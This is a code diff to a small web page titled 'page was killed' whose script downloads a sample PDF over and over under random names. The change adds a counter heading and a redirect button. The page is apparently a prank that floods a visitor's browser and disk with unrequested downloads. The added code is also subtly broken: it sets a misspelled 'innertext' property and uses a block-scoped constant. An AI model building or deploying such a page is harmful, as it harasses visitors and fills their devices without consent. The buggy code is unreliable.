@@ -4,7 +4,8 @@
 		<title>page was killed</title>
 	</head>
 	<body>
-		<button onclick='window.location.replace("https://www.google.co/")'></button>
+		<h1 id="displayAmount">downloading files : </h1>
+		<button onclick='window.location.replace("https://www.google.co/")'>go to google and remove site</button>
 	</body>
 	<script>
 		function downloadFile(url, fileName){
@@ -39,6 +40,7 @@
 			} else {
 				const fileAmount = fileAmountTemp;
 			};
+		document.getElementById("displayAmount").innertext = `downloading files : ${fileAmount}`;
 	    	for (let i = 0; i < fileAmount; i++) {
 	      		let name = makeid(10);
 	      		downloadFile('https://www.africau.edu/images/default/sample.pdf', name += ".pdf");
